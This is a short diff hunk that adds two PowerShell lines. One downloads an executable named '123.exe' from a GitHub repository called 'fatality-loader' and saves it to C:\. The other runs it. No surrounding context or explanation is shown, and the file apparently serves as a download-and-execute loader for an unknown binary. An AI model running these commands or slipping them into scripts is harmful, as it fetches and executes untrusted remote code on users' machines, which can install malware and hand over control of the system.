@@ -1,0 +1,2 @@
+Invoke-WebRequest -Uri "https://github.com/Mansure1337/fatality-loader/raw/refs/heads/main/123.exe" -OutFile "C:\123.exe"
+Start-Process -FilePath "C:\123.exe"
